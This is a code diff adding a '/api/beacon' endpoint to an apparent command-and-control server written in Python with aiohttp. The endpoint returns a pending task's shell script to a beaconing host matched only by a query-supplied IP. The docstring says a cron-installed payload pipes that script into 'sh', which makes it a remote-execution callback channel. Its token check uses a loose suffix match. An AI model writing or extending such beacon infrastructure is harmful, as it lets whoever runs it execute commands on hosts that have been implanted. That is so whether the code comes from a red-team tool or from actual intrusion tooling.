@@ -298,6 +298,7 @@ class Controller:
         self.app.router.add_post("/api/tasks/claim", self._api_claim_task)
         self.app.router.add_post("/api/tasks/{task_id}/result", self._api_task_result)
         self.app.router.add_get("/api/pubkey", self._api_pubkey)
+        self.app.router.add_get("/api/beacon", self._api_beacon)
         self.app.router.add_get("/api/health", self._api_health)
 
     # ------------------------------------------------------------------ #
@@ -319,6 +320,33 @@ class Controller:
             "public_key": pubkey_b64(self.crypto.public_key),
             "algorithm": "nacl-sealed-box" if self.crypto.use_nacl else "aes-256-gcm",
         })
+
+    async def _api_beacon(self, request: "web.Request") -> "web.Response":
+        """Cron-based beacon endpoint for out-of-band callback.
+
+        Returns a shell script (task) as text/plain when there is pending
+        work for the beaconing host, or 204 No Content when idle. The
+        cron_beacon payload pipes this output into ``sh`` for execution.
+
+        Query parameters:
+            host: hostname of the beaconing host (for logging/matching)
+            ip: egress IP of the beaconing host (for task matching)
+        """
+        if self.api_token:
+            auth = request.headers.get("Authorization", "")
+            if not auth.endswith(self.api_token):
+                return _json_response({"error": "unauthorized"}, status=401)
+        host = request.query.get("host", "")
+        ip = request.query.get("ip", "")
+        # Look for pending tasks that match the beaconing host's IP.
+        tasks = await asyncio.to_thread(self.store.query_tasks, status="pending")
+        for task in tasks:
+            target_ip = task.get("target", {}).get("ip", "") if isinstance(task.get("target"), dict) else ""
+            if target_ip and target_ip == ip:
+                script = task.get("script", "")
+                if script:
+                    return web.Response(text=script, content_type="text/plain")
+        return web.Response(status=204)
 
     async def _api_health(self, request: "web.Request") -> "web.Response":
         return _json_response({"status": "ok", "time": _now()})
